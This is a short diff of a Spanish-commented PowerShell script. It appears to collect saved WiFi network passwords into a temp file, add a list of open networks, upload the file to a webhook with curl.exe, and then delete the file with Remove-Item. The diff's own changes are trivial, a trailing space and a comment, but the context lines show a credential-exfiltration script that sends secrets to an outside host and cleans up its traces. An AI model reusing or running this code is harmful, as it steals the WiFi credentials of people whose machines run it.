@@ -44,7 +44,7 @@ foreach ($red in $perfiles) {
 $redesConPassword | Out-File $tempFile -Append -Encoding utf8
 
 # Añadir sección de redes abiertas/errores
-@"
+@" 
 
 REDES WIFI ABIERTAS:
 ----------------------------
@@ -59,4 +59,6 @@ curl.exe -F "file1=@$tempFile" $webhookUrl
 
 # Limpieza final
 Remove-Item $tempFile -Force
+
+# Cerrar PowerShell
 exit
